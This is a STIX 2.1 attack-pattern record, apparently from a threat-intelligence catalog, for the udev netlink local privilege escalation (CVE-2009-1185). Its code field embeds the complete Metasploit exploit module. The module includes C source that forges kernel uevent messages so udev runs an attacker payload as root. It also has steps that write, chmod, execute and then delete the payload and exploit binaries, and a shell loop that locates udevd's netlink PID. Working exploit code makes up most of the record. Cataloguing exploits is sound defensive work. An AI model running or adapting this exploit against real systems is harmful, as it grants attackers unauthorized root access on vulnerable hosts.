{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--92ee8437-4bcc-4ef6-99fd-80061fd753da",
    "created": "2024-08-14T16:59:06.476242Z",
    "modified": "2024-08-14T16:59:06.476246Z",
    "name": "Linux udev Netlink Local Privilege Escalation",
    "description": " Versions of udev < 1.4.1 do not verify that netlink messages are coming from the kernel. This allows local users to gain privileges by sending netlink messages from userland.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/udev_netlink.rb",
            "external_id": "udev_netlink.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-1185"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Post::File\n\n  include Msf::Exploit::Local::Linux\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'Linux udev Netlink Local Privilege Escalation',\n          'Description' => %q{\n            Versions of udev < 1.4.1 do not verify that netlink messages are\n            coming from the kernel. This allows local users to gain privileges by\n            sending netlink messages from userland.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'kcope', # discovery\n            'Jon Oberheide',   # 95-udev-late.rules technique\n            'egypt'            # metasploit module\n          ],\n          'Platform' => [ 'linux' ],\n          'Arch' => [ ARCH_X86, ARCH_X64 ],\n          'SessionTypes' => [ 'shell', 'meterpreter' ],\n          'References' => [\n            [ 'CVE', '2009-1185' ],\n            [ 'OSVDB', '53810' ],\n            [ 'BID', '34536' ]\n          ],\n          'Targets' => [\n            [ 'Linux x86', { 'Arch' => ARCH_X86 } ],\n            [ 'Linux x64', { 'Arch' => ARCH_X64 } ],\n            # [ 'Command payload', { 'Arch' => ARCH_CMD } ],\n          ],\n          'DefaultOptions' => { 'WfsDelay' => 2 },\n          'DefaultTarget' => 0,\n          'DisclosureDate' => '2009-04-16',\n          'Compat' => {\n            'Meterpreter' => {\n              'Commands' => %w[\n                stdapi_sys_process_get_processes\n              ]\n            }\n          },\n        }\n      )\n    )\n    register_options [\n      OptInt.new(\"NetlinkPID\", [ false, \"Usually udevd pid-1.  Meterpreter sessions will autodetect\" ])\n    ]\n    register_advanced_options [\n      OptString.new(\"WritableDir\", [ true, \"A directory where we can write files (must not be mounted noexec)\", \"/tmp\" ])\n    ]\n  end\n\n  def exploit\n    if datastore[\"NetlinkPID\"] and datastore[\"NetlinkPID\"] != 0\n      netlink_pid = datastore[\"NetlinkPID\"]\n    else\n      print_status(\"Attempting to autodetect netlink pid...\")\n      netlink_pid = autodetect_netlink_pid\n    end\n\n    if not netlink_pid\n      print_error \"Couldn't autodetect netlink PID, try specifying it manually.\"\n      print_error \"Look in /proc/net/netlink for a PID near that of the udevd process\"\n      return\n    else\n      print_good \"Found netlink pid: #{netlink_pid}\"\n    end\n\n    sc = Metasm::ELF.new(@cpu)\n    sc.parse %Q|\n      #define DEBUGGING\n      #define NULL ((void*)0)\n      #ifdef __ELF__\n        .section \".bss\" rwx\n        .section \".text\" rwx\n        .entrypoint\n      #endif\n      call main\n      push eax\n      call exit\n    |\n\n    payload_path = \"#{datastore[\"WritableDir\"]}/#{Rex::Text.rand_text_alpha(10)}\"\n    evil_path = \"#{datastore[\"WritableDir\"]}/#{Rex::Text.rand_text_alpha(10)}\"\n\n    main = %Q^\n/*\n** All of these includes are now factorized.\n**/\n/*\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <stdarg.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <errno.h>\n#include <string.h>\n#include <linux/netlink.h>\n*/\n\n#define NETLINK_KOBJECT_UEVENT 15\n#define PF_NETLINK 16\n#define SOCK_DGRAM 2\n#define AF_NETLINK PF_NETLINK\n\ntypedef unsigned short __kernel_sa_family_t;\ntypedef unsigned int __socklen_t;\ntypedef int __ssize_t;\ntypedef unsigned int __u32;\nextern int close(int __fd);\ntypedef unsigned short sa_family_t;\ntypedef unsigned long size_t;\nextern int socket(int __domain, int __type, int __protocol);\nextern int sprintf(char *__s, const char *__format, ...);\n\nconst struct iovec {\n  void *iov_base;\n  size_t iov_len;\n};\nextern void *memset(void *__s, int __c, size_t __n);\n\nconst struct sockaddr {\n  sa_family_t sa_family;\n  char sa_data[14];\n};\n\nstruct sockaddr_nl {\n  __kernel_sa_family_t nl_family;\n  unsigned short nl_pad;\n  __u32 nl_pid;\n  __u32 nl_groups;\n};\ntypedef __socklen_t socklen_t;\ntypedef __ssize_t ssize_t;\n\nextern int bind(int __fd, const struct sockaddr *__addr, socklen_t __len);\n\nconst struct msghdr {\n  void *msg_name;\n  socklen_t msg_namelen;\n  const struct iovec *msg_iov;\n  size_t msg_iovlen;\n  void *msg_control;\n  size_t msg_controllen;\n  int msg_flags;\n};\n\nextern ssize_t sendmsg(int __fd, const struct msghdr *__message, int __flags);\n/* end factorize */\n\n#define NULL 0\n\nint main() {\n  int sock;\n  struct iovec iov;\n  struct sockaddr_nl sa;\n  struct msghdr msg;\n  char *mp;\n  char message[4096];\n\n  memset(sa, 0, sizeof(sa));\n  sa.nl_family = AF_NETLINK;\n  sa.nl_pid = #{netlink_pid};\n  sa.nl_groups = 0;\n\n  memset(&msg, 0x00, sizeof(struct msghdr));\n  msg.msg_name = (void *)&sa;\n  msg.msg_namelen = sizeof(sa);\n  msg.msg_iov = &iov;\n  msg.msg_iovlen = 1;\n  msg.msg_control = NULL;\n  msg.msg_controllen = 0;\n  msg.msg_flags = 0;\n\n  sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT);\n  bind(sock, (struct sockaddr *) &sa, sizeof(sa));\n\n  mp = message;\n  mp += sprintf(mp, \"remove@/d\") + 1;\n  mp += sprintf(mp, \"SUBSYSTEM=block\") + 1;\n  mp += sprintf(mp, \"DEVPATH=/dev/#{Rex::Text.rand_text_alpha(10)}\") + 1;\n  mp += sprintf(mp, \"TIMEOUT=10\") + 1;\n  mp += sprintf(mp, \"ACTION=remove\") +1;\n  mp += sprintf(mp, \"REMOVE_CMD=#{payload_path}\") +1;\n\n  iov.iov_base = (void*)message;\n  iov.iov_len = (int)(mp-message);\n\n  sendmsg(sock, &msg, 0);\n\n  close(sock);\n\n  return 0;\n}\n^\n    cparser.parse(main, \"main.c\")\n    # This will give you all the structs and #defines (from all included\n    # headers) that are actually used by our C code so we can avoid\n    # needing them at runtime.\n    # puts cparser.factorize\n\n    asm = cpu.new_ccompiler(cparser, sc).compile\n\n    sc.parse asm\n\n    sc.assemble\n\n    begin\n      elf = sc.encode_string\n    rescue => e\n      print_error 'Metasm Encoding failed'\n      elog('Metasm Encoding failed', error: e)\n      return\n    end\n\n    pl = payload.encoded_exe\n    print_status \"Writing payload executable (#{pl.length} bytes) to #{payload_path}\"\n    write_file(payload_path, pl)\n\n    print_status \"Writing exploit executable (#{elf.length} bytes) to #{evil_path}\"\n    write_file(evil_path, elf)\n\n    print_status \"chmod'ing and running it...\"\n    cmd_exec(\"chmod 755 #{evil_path} #{payload_path}\")\n    cmd_exec(\"#{evil_path}\")\n\n    rm_f(evil_path, payload_path)\n  end\n\n  def autodetect_netlink_pid\n    netlink_pid = nil\n\n    case session.type\n    when \"meterpreter\"\n      print_status(\"Meterpreter session, using get_processes to find netlink pid\")\n      process_list = session.sys.process.get_processes\n      udev_proc = process_list.find { |p| p[\"name\"] =~ /udevd/ }\n      udev_pid = udev_proc[\"pid\"]\n      print_status \"udev pid: #{udev_pid}\"\n      netlink = read_file(\"/proc/net/netlink\")\n      netlink.each_line do |line|\n        pid = line.split(/\\s+/)[2].to_i\n        if pid == udev_pid - 1\n          netlink_pid = pid\n          break\n        end\n      end\n    else\n      print_status(\"Shell session, trying sh script to find netlink pid\")\n      netlink_pid = cmd_exec(\n        %q^\n        for netlink_pid in $(awk '{print $3}' /proc/net/netlink |sort -u|grep -v -- -); do\n          for udev_pid in $(ps aux | grep [u]devd | awk '{print $2}'); do\n            [ $(( $udev_pid-1 )) = $netlink_pid ] && echo $netlink_pid ;\n          done;\n        done ^\n      )\n      netlink_pid = nil if netlink_pid.empty?\n    end\n\n    netlink_pid\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-04-16",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}